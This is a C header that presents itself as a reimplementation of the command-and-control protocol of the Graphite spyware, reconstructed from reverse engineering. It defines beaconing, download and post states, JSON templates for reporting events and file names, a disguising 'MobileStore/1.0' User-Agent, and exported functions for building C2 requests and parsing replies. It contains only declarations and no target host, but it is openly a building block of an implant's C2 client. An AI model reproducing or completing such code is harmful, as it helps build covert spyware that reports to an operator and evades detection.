// graphite_c2_protocol.h - C2 Protocol (C)
// Based on VERBATIM C2 protocol from Coruna/Graphite reverse engineering
// Features: HTTP GET/POST, JSON body, User-Agent "MobileStore/1.0",
//           state machine (IDLE, DOWNLOAD, BUSY, QBRDR, ERROR, DONE, BEACON, POST)

#ifndef GRAPHITE_C2_PROTOCOL_H
#define GRAPHITE_C2_PROTOCOL_H

#include <stdint.h>
#include <stddef.h>

#ifdef _WIN32
    #define C2P_EXPORT __declspec(dllexport)
#else
    #define C2P_EXPORT __attribute__((visibility("default")))
#endif

#ifdef __cplusplus
extern "C" {
#endif

// C2 states
#define C2_ST_IDLE     0
#define C2_ST_DOWNLOAD 1
#define C2_ST_BUSY     2
#define C2_ST_QBRDR    3
#define C2_ST_ERROR    4
#define C2_ST_DONE     5
#define C2_ST_BEACON   6
#define C2_ST_POST     7

// HTTP methods
#define C2_METHOD_GET  0
#define C2_METHOD_POST 1

// JSON templates
#define C2_JSON_EVENT      "{\"e\":%u,\"l\":%u}"
#define C2_JSON_EVENT_FILE "{\"e\":%u,\"f\":\"%s\",\"l\":%u}"
#define C2_JSON_LOGMSG     "{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}"

// Constants
#define C2_HTTP_TIMEOUT_MS  10000
#define C2_STATUS_REJECT    400
#define C2_BUFFER_SIZE      16777216  // 16MB
#define C2_UA_MOBILE_STORE  "MobileStore/1.0"
#define C2_CONTENT_TYPE     "application/json"

// C2 state context
typedef struct {
    int state;
    char base_url[512];
    char filename[256];
    char body[8192];
    size_t body_len;
    unsigned int event_id;
    unsigned int line_num;
    int http_method;
    int status_code;
} C2Context;

// Initialize C2 context
C2P_EXPORT void c2p_init(C2Context *ctx, const char *base_url);

// State transitions
C2P_EXPORT int c2p_transition(C2Context *ctx, int new_state);

// Build JSON body
C2P_EXPORT size_t c2p_build_json_event(char *out, size_t out_size, unsigned int e, unsigned int l);
C2P_EXPORT size_t c2p_build_json_event_file(char *out, size_t out_size, unsigned int e, const char *f, unsigned int l);
C2P_EXPORT size_t c2p_build_json_logmsg(char *out, size_t out_size, const char *msg);

// Build HTTP request
C2P_EXPORT size_t c2p_build_request(char *out, size_t out_size, C2Context *ctx);

// Parse HTTP response status
C2P_EXPORT int c2p_parse_status(const char *response, size_t len);

// State name
C2P_EXPORT const char* c2p_state_name(int state);

#ifdef __cplusplus
}
#endif

#endif
